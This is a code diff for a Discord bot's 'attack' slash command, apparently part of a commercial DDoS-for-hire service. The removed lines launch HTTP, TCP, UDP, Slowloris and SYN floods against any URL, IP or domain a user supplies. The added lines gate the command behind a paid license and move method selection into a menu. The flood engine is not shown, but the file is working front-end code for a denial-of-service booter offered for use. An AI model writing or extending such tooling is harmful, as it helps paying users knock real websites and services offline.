@@ -1,60 +1,52 @@
-import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from 'discord.js';
+import {
+  SlashCommandBuilder,
+  ChatInputCommandInteraction,
+  EmbedBuilder,
+  StringSelectMenuBuilder,
+  ActionRowBuilder,
+  ModalBuilder,
+  TextInputBuilder,
+  TextInputStyle,
+} from 'discord.js';
 import { AttackConfig, DDoSMethod } from '../../types';
 import { ddosService } from '../../services/ddos';
-import { isValidUrl, isValidIp, isValidDomain, isValidDuration, isValidThreads, isAdmin } from '../../utils/validators';
+import { isValidUrl, isValidIp, isValidDomain, isValidDuration, isValidThreads } from '../../utils/validators';
 import { rateLimiter } from '../../utils/rate-limiter';
 import { logger } from '../../utils/logger';
+import { licenseService } from '../../services/license';
 
 export const data = new SlashCommandBuilder()
   .setName('attack')
-  .setDescription('Launch a DDoS attack')
-  .addStringOption((option) =>
-    option
-      .setName('target')
-      .setDescription('Target URL, IP, or domain')
-      .setRequired(true)
-  )
-  .addStringOption((option) =>
-    option
-      .setName('method')
-      .setDescription('Attack method')
-      .setRequired(true)
-      .addChoices(
-        { name: 'HTTP Flood', value: 'http-flood' },
-        { name: 'TCP Flood', value: 'tcp-flood' },
-        { name: 'UDP Flood', value: 'udp-flood' },
-        { name: 'Slowloris', value: 'slowloris' },
-        { name: 'SYN Flood', value: 'syn-flood' }
+  .setDescription('Launch a DDoS attack');
+
+const attackMethods = [
+  { value: 'http-flood', label: 'HTTP Flood', description: 'Flood HTTP requests to target', emoji: '🌊' },
+  { value: 'tcp-flood', label: 'TCP Flood', description: 'Flood TCP connections', emoji: '⚡' },
+  { value: 'udp-flood', label: 'UDP Flood', description: 'Flood UDP packets', emoji: '💥' },
+  { value: 'slowloris', label: 'Slowloris', description: 'Slow HTTP attack', emoji: '🐌' },
+  { value: 'syn-flood', label: 'SYN Flood', description: 'Flood SYN packets', emoji: '🔥' },
+];
+
+function createMethodSelectMenu(): ActionRowBuilder<StringSelectMenuBuilder> {
+  return new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(
+    new StringSelectMenuBuilder()
+      .setCustomId('attack_method_select')
+      .setPlaceholder('Select an attack method...')
+      .addOptions(
+        attackMethods.map((method) => ({
+          label: method.label,
+          description: method.description,
+          value: method.value,
+          emoji: method.emoji,
+        }))
       )
-  )
-  .addIntegerOption((option) =>
-    option
-      .setName('duration')
-      .setDescription('Attack duration in seconds')
-      .setRequired(true)
-      .setMinValue(1)
-      .setMaxValue(300)
-  )
-  .addIntegerOption((option) =>
-    option
-      .setName('threads')
-      .setDescription('Number of threads')
-      .setRequired(true)
-      .setMinValue(1)
-      .setMaxValue(100)
-  )
-  .addIntegerOption((option) =>
-    option
-      .setName('port')
-      .setDescription('Target port (for TCP/UDP floods)')
-      .setMinValue(1)
-      .setMaxValue(65535)
   );
+}
 
 export async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
-  if (!isAdmin(interaction.user.id)) {
+  if (!licenseService.hasPermission(interaction.user.id, 'attack')) {
     await interaction.reply({
-      content: '❌ You do not have permission to use this command.',
+      content: '❌ You need a valid license with attack permission to use this command. Use `/license-activate` to activate your license.',
       ephemeral: true,
     });
     return;
@@ -68,69 +60,26 @@ export async function execute(interaction: ChatInputCommandInteraction): Promise
     return;
   }
 
-  const target = interaction.options.getString('target', true);
-  const method = interaction.options.getString('method', true) as DDoSMethod;
-  const duration = interaction.options.getInteger('duration', true);
-  const threads = interaction.options.getInteger('threads', true);
-  const port = interaction.options.getInteger('port');
+  const embed = new EmbedBuilder()
+    .setTitle('🚀 Launch DDoS Attack')
+    .setColor(0xff0000)
+    .setDescription('Select an attack method from the menu below to configure your attack.')
+    .addFields(
+      {
+        name: '📋 Available Methods',
+        value: attackMethods.map((m) => `${m.emoji} **${m.label}** - ${m.description}`).join('\n'),
+        inline: false,
+      }
+    )
+    .setFooter({ text: 'Select a method to continue' })
+    .setTimestamp();
 
-  if (!isValidUrl(target) && !isValidIp(target) && !isValidDomain(target)) {
-    await interaction.reply({
-      content: '❌ Invalid target. Please provide a valid URL, IP address, or domain.',
-      ephemeral: true,
-    });
-    return;
-  }
+  const selectMenu = createMethodSelectMenu();
 
-  if (!isValidDuration(duration)) {
-    await interaction.reply({
-      content: `❌ Invalid duration. Maximum allowed: 300 seconds.`,
-      ephemeral: true,
-    });
-    return;
-  }
-
-  if (!isValidThreads(threads)) {
-    await interaction.reply({
-      content: `❌ Invalid thread count. Maximum allowed: 100.`,
-      ephemeral: true,
-    });
-    return;
-  }
-
-  await interaction.deferReply();
-
-  try {
-    const config: AttackConfig = {
-      target,
-      method,
-      duration,
-      threads,
-      port: port || undefined,
-    };
-
-    await ddosService.start(config);
-
-    const embed = new EmbedBuilder()
-      .setTitle('🚀 Attack Launched')
-      .setColor(0xff0000)
-      .addFields(
-        { name: 'Target', value: target, inline: true },
-        { name: 'Method', value: method, inline: true },
-        { name: 'Duration', value: `${duration}s`, inline: true },
-        { name: 'Threads', value: threads.toString(), inline: true },
-        { name: 'Port', value: port ? port.toString() : 'N/A', inline: true }
-      )
-      .setTimestamp();
-
-    await interaction.editReply({ embeds: [embed] });
-
-    logger.info(`Attack launched by ${interaction.user.id} on ${target}`);
-  } catch (error: any) {
-    logger.error('Failed to launch attack', error);
-    await interaction.editReply({
-      content: `❌ Failed to launch attack: ${error.message}`,
-    });
-  }
+  await interaction.reply({
+    embeds: [embed],
+    components: [selectMenu],
+    ephemeral: true,
+  });
 }
 
